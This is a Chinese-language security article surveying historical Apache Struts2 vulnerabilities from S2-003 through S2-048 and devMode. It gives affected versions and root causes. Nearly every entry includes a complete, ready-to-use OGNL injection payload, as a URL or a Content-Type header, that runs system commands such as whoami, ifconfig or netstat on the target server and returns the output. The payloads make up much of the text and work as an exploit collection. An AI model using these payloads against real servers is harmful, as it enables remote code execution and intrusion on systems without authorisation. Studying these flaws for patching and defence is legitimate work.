> 原文链接: https://www.anquanke.com//post/id/86757 


# 【技术分享】浅谈struts2历史上的高危漏洞


                                阅读量   
                                **243322**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**[![](https://p4.ssl.qhimg.com/t014f85e9fe5230ca26.jpg)](https://p4.ssl.qhimg.com/t014f85e9fe5230ca26.jpg)**

****

作者：[**Carpediem**](http://bobao.360.cn/member/contribute?uid=2659563319)

预估稿费：300RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**前言**

Apache Struts2作为世界上最流行的Java Web框架之义，广泛应用于教育、金融、互联网、通信等重要行业。它的一个高危漏洞危害都有可能造成重大的互联网安全风险和巨大的经济损失。本文旨在对以往的高危漏洞形成原因、受影响的版本以及相应的利用方式进行一次梳理，若有不完善的地方欢迎大家指正。

先来介绍一些基本知识：Struts1是全世界第一个发布的MVC框架，Struts2实在webwork和Struts1的基础上开发的，Struts2和webwork底层都用到了xwork。并且整合了一种更为强大的表达式语言：ognl。基于Struts2框架开发项目的时候，需要引用一些基础的jar包，在Struts 2.0.*的时候，Struts2的必备jar包需要如下5个：



```
struts2-core-x.x.jar -----------------struts2的核心包
Freemarker-x.x.jar---------------------FreeMarker是一个模板引擎，一个基于模板生成文本输出的通用工具
commons-logging.jar ------------------通用日志记录包
ognl-x.x.jar ——————— ---------支持ognl表达式
xwork-x.x.jar ——————— --------xwork的包 由于Struts2是由xwork的延伸 有些类依然关联着 xwork的类
```

之后的版本的struts2可能还需要其他的jar包，比如commons-fileupload-1.2.1.jar 支持文件上传的jar包。

apache（[http://struts.apache.org/docs/security-bulletins.html](http://struts.apache.org/docs/security-bulletins.html)）历史上涉及的高危漏洞如下：S2-003，S2-005，S2-007，S2-008，S2-009，S2-012~S2-016，S2-019、S2-032、S2-033、S2-037、S2-045、S2-046、S2-048、DevMode。

<br>

**一 S2-003、S2-005、S2-007**

**S2-003**

受影响版本：低于Struts 2.0.12

Struts2会将HTTP的每个参数名解析为ognl语句执行（可理解为Java代码）。ognl表达式通过#来访问struts的对象，Struts框架通过过滤#字符防止安全问题，然后通过unicode编码（u0023）或8进制（43）即绕过了安全限制。

**S2-005**

受影响版本：低于Struts 2.2.1

对于S2-003漏洞，官方通过增加安全配置（禁止静态方法调用和类方法执行等）来修补，安全配置被绕过再次导致了漏洞。

EXP:[](http://127.0.0.1:8080/struts2-showcase-2.1.6/showcase.action?%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&amp;%28b%29%28%28%27%5C43context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5C75false%27%29%28b%29%29&amp;%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&amp;%28g%29%28%28%27%5C43mycmd%5C75%5C%27whoami%5C%27%27%29%28d%29%29&amp;%28h%29%28%28%27%5C43myret%5C75@java.lang.Runtime@getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&amp;%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&amp;%28j%29%28%28%27%5C43myres%5C75new%5C40byte%5B51020%5D%27%29%28d%29%29&amp;%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&amp;%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&amp;%28m%29%28%28%27%5C43myout%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&amp;%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29)

```
http://127.0.0.1:8080/struts2-showcase-2.1.6/showcase.action?%28%2743_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&amp;%28b%29%28%28%2743context[%27xwork.MethodAccessor.denyMethodExecution%27]75false%27%29%28b%29%29&amp;%28%2743c%27%29%28%28%2743_memberAccess.excludeProperties75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&amp;%28g%29%28%28%2743mycmd75%27whoami%27%27%29%28d%29%29&amp;%28h%29%28%28%2743myret75@java.lang.Runtime@getRuntime%28%29.exec%2843mycmd%29%27%29%28d%29%29&amp;%28i%29%28%28%2743mydat75new40java.io.DataInputStream%2843myret.getInputStream%28%29%29%27%29%28d%29%29&amp;%28j%29%28%28%2743myres75new40byte[51020]%27%29%28d%29%29&amp;%28k%29%28%28%2743mydat.readFully%2843myres%29%27%29%28d%29%29&amp;%28l%29%28%28%2743mystr75new40java.lang.String%2843myres%29%27%29%28d%29%29&amp;%28m%29%28%28%2743myout75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&amp;%28n%29%28%28%2743myout.getWriter%28%29.println%2843mystr%29%27%29%28d%29%29
```

执行的“whoami”命令，将会直接写入到showcase.action文件中，并下载到本地。

**S2-007**

受影响版本：低于Struts 2.2.3.1

S2-007和S2-003、S2-005的漏洞源头都是一样的，都是struts2对OGNL的解析过程中存在漏洞，导致黑客可以通过OGNL表达式实现代码注入和执行，所不同的是:

1. S2-003、S2-005: 通过OGNL的name-value的赋值解析过程、#访问全局静态变量(AOP思想)实现代码执行

2. S2-007: 通过OGNL中String向long转换过程实现代码执行

假设hello.java中定义了一个整数long id，id来自于用户输入，传递一个非整数给id导致错误，struts会将用户的输入当作ongl表达式执行，从而导致了漏洞,因此要想利用此漏洞，程序中必须有可以接受外界输入的id等参数。

EXP:

```
http://x.x.x.x/hello.action?id='%2b(%23_memberAccess.allowStaticMethodAccess=true,%23context["xwork.MethodAccessor.denyMethodExecution"]=false,%23cmd="ifconfig",%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[500],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))%2b'
```



**二 S2-009**

受影响版本：低于Struts 2.3.1.1

EXP:[](http://127.0.0.1:8080/struts2-showcase-2.1.6/showcase.action?foo=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3D+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27mkdir%20/tmp/PWNAGE%27%29%29%28meh%29&amp;z%5B%28foo%29%28%27meh%27%29%5D=true)

```
http://127.0.0.1:8080/struts2-showcase-2.1.6/showcase.action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27mkdir%20/tmp/PWNAGE%27%29%29%28meh%29&amp;z[%28foo%29%28%27meh%27%29]=true
```

将会在系统上建立/tmp/PWNAGE文件。

<br>

**三 S2-012、S2-013**

受影响版本：低于Struts 2.3.14.1

struts2中可以通过$`{`express`}`或%`{`express`}`来引用ongl表达式，当配置一个action中有$`{`input`}`或%`{`input`}`且input来自于外部输入时，给input赋值%`{`exp`}`，从而导致任意代码执行。Struts2标签库中的url标签和a标签的includeParams这个属性，代表显示请求访问参数的含义，一旦它的值被赋予ALL或者GET或者 POST，就会显示具体请求参数内容，问题在于，struts竟然把参数做了OGNL解析。

x.jsp

```
&lt;s:a includeParams="all"&gt;Click here.&lt;/s:a&gt;
```

EXP:

```
http://x.x.x.x/x.jsp?a=1$`{`(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())`}`
```



**四 S2-016**

受影响版本：低于Struts 2.3.15.1

在struts2中，DefaultActionMapper类支持以”action:”、”redirect:”、”redirectAction:"作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。

以“redirect”为例进行命令执行：

EXP1:[](http://127.0.0.1:8080/struts2-showcase-2.1.6/showcase.action?redirect:%24%7B%23a%3D%28new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%20%7B%27netstat%27,%27-an%27%7D%29%29.start%28%29,%23b%3D%23a.getInputStream%28%29,%23c%3Dnew%20java.io.InputStreamReader%20%28%23b%29,%23d%3Dnew%20java.io.BufferedReader%28%23c%29,%23e%3Dnew%20char%5B50000%5D,%23d.read%28%23e%29,%23matt%3D%20%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%20%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29%7D)

```
http://127.0.0.1:8080/struts2-showcase-2.1.6/showcase.action?redirect:$`{`%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]%20`{`%27netstat%27,%27-an%27`}`%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%20%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%20%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%20%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29`}`
```

[](http://127.0.0.1:8080/struts2-showcase-2.1.6/showcase.action?redirect:%24%7B%23a%3D%28new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%20%7B%27netstat%27,%27-an%27%7D%29%29.start%28%29,%23b%3D%23a.getInputStream%28%29,%23c%3Dnew%20java.io.InputStreamReader%20%28%23b%29,%23d%3Dnew%20java.io.BufferedReader%28%23c%29,%23e%3Dnew%20char%5B50000%5D,%23d.read%28%23e%29,%23matt%3D%20%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%20%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29%7D)

**五 S2-019**

Struts 2.0.0 – Struts 2.3.15.1

Struts 2.3.15.2以后的版本默认关闭开发模式,  比较鸡肋。

```
&lt;constant name="struts.enable.DynamicMethodInvocation" value="false”/&gt;
```

EXP:

```
http://x.x.x.x/x.action?debug=command&amp;expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]`{`'whoami'`}`)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[1000],#d.read(#e),#resp.println(#e),#resp.close()
```



**六 S2-032  S2-033   S2-037**

受影响版本：2.3.18-2.3.28(except 2.3.20.2 and 2.3.24.2)。

**S2-032**

假如动态方法调用已经开启,然后我们要调用对应的login方法的话 我们可以通过[http://localhost:8080/struts241/index!login.action](http://localhost:8080/struts241/index!login.action)来执行动态的方法调用。这种动态方法调用的时候method中的特殊字符都会被替换成空，但是可以通过[http://localhost:8080/struts241/index.action?method:login](http://localhost:8080/struts241/index.action?method:login%C0%B4%C8%C6%B9%FD%CE%DE%B7%A8%B4%AB%C8%EB%CC%D8%CA%E2%D7%D6%B7%FB%B5%C4%CF%DE%D6%C6)[来绕过无法传入特殊字符的限制](http://localhost:8080/struts241/index.action?method:login%C0%B4%C8%C6%B9%FD%CE%DE%B7%A8%B4%AB%C8%EB%CC%D8%CA%E2%D7%D6%B7%FB%B5%C4%CF%DE%D6%C6)。

EXP:

```
http://x.x.x.x/x.action?method:%23_memberAccess[%23parameters.name1[0]]%3dtrue,%23_memberAccess[%23parameters.name[0]]%3dtrue,%23_memberAccess[%23parameters.name2[0]]%3d`{``}`,%23_memberAccess[%23parameters.name3[0]]%3d`{``}`,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew%20java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;name=allowStaticMethodAccess&amp;name1=allowPrivateAccess&amp;name2=excludedPackageNamePatterns&amp;name3=excludedClasses&amp;cmd=whoami&amp;pp=\\A&amp;ppp=%20&amp;encoding=UTF-8
```

**S2-033**

该漏洞依附于S2-032漏洞，当开启动态方法调用，并且同时使用了Strut2 REST Plugin插件时，使用“!”操作符调用动态方法可能执行ognl表达式，导致代码执行。

EXP:[](http://localhost:8080/struts2-rest-showcase-280/orders/3!%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command%5B0%5D),%23xx%3D123,%23xx.toString.json?&amp;command=calc.exe)

```
http://localhost:8080/struts2-rest-showcase-280/orders/3!%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23xx%3d123,%23xx.toString.json?&amp;command=calc.exe
```

**S2-037**

该漏洞受影响版本等同于S2-032、S2-003，尽管不需要配置struts.enable.DynamicMethodInvocation为true，但是需要调用Strut2 REST 插件才能触发。Strut2 REST还支持actionName/id/methodName这种方式处理解析uri，直接将id后面的内容作为method属性设置到mapping中。

EXP:[](http://localhost:8080/struts2-rest-showcase-280/orders/3/%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command%5B0%5D),%23xx%3D123,%23xx.toString.json?&amp;command=calc.exe)

```
http://localhost:8080/struts2-rest-showcase-280/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23xx%3d123,%23xx.toString.json?&amp;command=calc.exe
```



**七 S2-045 、S2-046**

受影响的版本：



Struts 2.3.5 – Struts 2.3.31

Struts 2.5 – Struts 2.5.10

**S2-045:**

这个漏洞是由于Strus2对错误消息处理出现了问题，通过Content-Type这个header头，注入OGNL语言，进而执行命令。攻击者可以将恶意代码通过http报文头部的Content-Type字段传递给存在漏洞的服务器，导致任意代码执行漏洞，要想顺利触发德华，lib中一定要有commons-fileupload-x.x.x.jar包

```
Content-Type：%`{`(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?`{`'cmd.exe','/c',#cmd`}`:`{`'/bin/bash','-c',#cmd`}`)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())`}`
```

**S2-046:**

该漏洞与S2-045触发点一样，但利用方式不同，使用恶意的Content-Disposition值或者使用不合适的Content-Length头就可能导致远程命令执行。

<br>

**八 S2-048**

受影响的Struts版本：Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本

这个漏洞主要问题出在struts2-struts1-plugin这个非默认的插件包上，由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同时这个 getText() 的 参数输入点，又可以被用户直接进行控制，如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击。该漏洞利用的payload 与s2-045其实都是一样的，只是触发点不同和影响范围不同而已。

```
Content-Type:%`{`(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?`{`'cmd.exe','/c',#cmd`}`:`{`'/bin/bash','-c',#cmd`}`)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())`}`
```



**九 DevMode**

影响版本：Struts 2.1.0–2.5.1

S2-008漏洞也是一个devMode下的远程执行漏洞，由于当时Apache还没有专门的声明，要求开发者在发布系统的时候必须关闭devMode，因此这个漏洞当时还是被他们给予了CVE编号，并在后续比较迟的时候增加了对其利用方式的过滤处理。CVE编号授予的时候，Struts2的最新版本为2.3.1，但在其后直至2.3.28之前的版本都能够触发这个漏洞，从2.3.29开始，官方增加了一个检查项——禁止链式表达式，这才阻止了特定ognl表达式的执行。但是不得不说该漏洞一直存在，只是利用条件变得越来越苛刻。

当struts.xml或struts.properties配置文件中

```
&lt; constant name=“struts.devMode” value=“true” /&gt;
```

便会触发相应漏洞。

EXP1:

```
http://localhost:8080/test02/Login.action?debug=command&amp;expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2c%23b%3dnew java.io.InputStreamReader%28%23a%29%2c%23c%3dnew java.io.BufferedReader%28%23b%29%2c%23d%3dnew char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29
```

EXP2:[](http://localhost:8080/test02/Login.action?debug=command&amp;expression=%23application)

```
http://localhost:8080/test02/Login.action?debug=command&amp;expression=%23application
```

[](http://localhost:8080/test02/Login.action?debug=command&amp;expression=%23application)

**参考文章**

1.[http://blog.csdn.net/qq_29277155/article/details/51672877](http://blog.csdn.net/qq_29277155/article/details/51672877)

2.[http://netsecurity.51cto.com/art/201707/544837.htm](http://netsecurity.51cto.com/art/201707/544837.htm)

3.[https://www.seebug.org/vuldb/ssvid-92088](https://www.seebug.org/vuldb/ssvid-92088)

4.[https://www.waitalone.cn/struts2-command-exp.html](https://www.waitalone.cn/struts2-command-exp.html)

5.[https://cwiki.apache.org/confluence/display/WW/S2-009](https://cwiki.apache.org/confluence/display/WW/S2-009)

6.[http://www.cnblogs.com/shellr00t/p/5721558.html](http://www.cnblogs.com/shellr00t/p/5721558.html)
